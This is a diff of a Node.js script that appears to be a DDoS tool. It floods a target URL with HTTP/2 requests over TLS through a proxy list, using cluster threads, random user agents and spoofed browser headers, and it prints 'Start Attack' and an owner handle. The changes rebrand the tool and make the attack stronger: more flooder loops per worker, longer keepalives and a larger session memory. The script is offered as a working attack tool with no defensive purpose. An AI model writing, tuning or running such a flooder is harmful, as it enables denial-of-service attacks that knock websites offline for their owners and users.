@@ -1,44 +1,16 @@
-const net = require("net");
+ const net = require("net");
  const http2 = require("http2");
  const tls = require("tls");
  const cluster = require("cluster");
  const url = require("url");
  const crypto = require("crypto");
  const fs = require("fs");
+ 
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
 
- if (process.argv.length < 5){
-    console.log(`Tls by Rizz\nUsage: node tls-sucuri.js URL TIME REQ_PER_SEC THREADS\nExample: node tls-sucuri.js https://dstat.cc/ 60 64 10`); process.exit();}
+ if (process.argv.length < 5){console.log(`[VVIP]\n How To use?: node tlsv5 url time rps thread`); process.exit();}
  
- const nullHexs = [
-"\x00", 
-"\xFF", 
-"\xC2", 
-"\xA0",
-"\x82",
-"\x56",
-"\x87",
-"\x88",
-"\x27",
-"\x31",
-"\x18",
-"\x42",
-"\x17",
-"\x90",
-"\x14",
-"\x82",
-"\x18",
-"\x26",
-"\x61",
-"\x04",
-"\x05",
-"\xac",
-"\x02",
-"\x50",
-"\x84",
-"\x78"
-];
  const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
  const ciphers = "GREASE:" + [
      defaultCiphers[2],
@@ -77,7 +49,6 @@ const net = require("net");
      secureOptions: secureOptions,
      secureProtocol: secureProtocol
  };
- 
 
 let now = new Date();
 let year = now.getFullYear();
@@ -91,10 +62,10 @@ var countries = ["Indonesia", "Malaysia", "Singapore", "Thailand", "Vietnam", "P
 var randomCountry = countries[Math.floor(Math.random() * countries.length)];
 
 // Menampilkan negara yang dipilih secara acak
-
+ 
  const secureContext = tls.createSecureContext(secureContextOptions);
  
- var proxyFile = "http.txt";
+ var proxyFile = "proxy.txt";
  var proxies = readLines(proxyFile);
  var userAgents = readLines("ua.txt");
  
@@ -104,8 +75,8 @@ var randomCountry = countries[Math.floor(Math.random() * countries.length)];
      Rate: ~~process.argv[4],
      threads: ~~process.argv[5]
  }
-
-  const parsedTarget = url.parse(args.target);
+ 
+ const parsedTarget = url.parse(args.target);
 
  if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
@@ -117,12 +88,12 @@ console.log(``)
 console.log(`Target: ${process.argv[2]}`);
 console.log(`Port: ${process.argv[4]}`);
 console.log(`Time: ${process.argv[3]}`);
-console.log(`Methods: Tls `);
+console.log(`Methods: MixBill`);
 console.log("Org: " + randomCountry);
 console.log(`Start Attack: ${year}-${month}-${hours}`);
 console.log(`Owner: @Erorr37cs`);
 
-} else {for (let i = 0; i < 10; i++) { setInterval(runFlooder, 0) }}
+} else {for (let i = 0; i < 120; i++) { setInterval(runFlooder, 0) }}
  
  class NetSocket {
      constructor(){}
@@ -141,8 +112,8 @@ console.log(`Owner: @Erorr37cs`);
          readable: true
      });
  
-     connection.setTimeout(options.timeout * 10000);
-     connection.setKeepAlive(true, 10000);
+     connection.setTimeout(options.timeout * 100000);
+     connection.setKeepAlive(true, 100000);
      connection.setNoDelay(true)
  
      connection.on("connect", () => {
@@ -205,7 +176,6 @@ console.log(`Owner: @Erorr37cs`);
  headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
  headers["sec-fetch-dest"] = "document";
  headers["sec-fetch-mode"] = "navigate";
- headers["x-requested-with"] = "XMLHttpRequest";
  headers["sec-fetch-site"] = "same-origin";
  headers["upgrade-insecure-requests"] = "1";
  
@@ -228,7 +198,7 @@ console.log(`Owner: @Erorr37cs`);
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 60000);
+         connection.setKeepAlive(true, 600000);
          connection.setNoDelay(true)
  
          const settings = {
@@ -267,7 +237,7 @@ console.log(`Owner: @Erorr37cs`);
          const client = http2.connect(parsedTarget.href, {
              protocol: "https:",
              settings: settings,
-             maxSessionMemory: 3333,
+             maxSessionMemory: 655000,
              maxDeflateDynamicTableSize: 4294967295,
              createConnection: () => tlsConn
              //socket: connection,
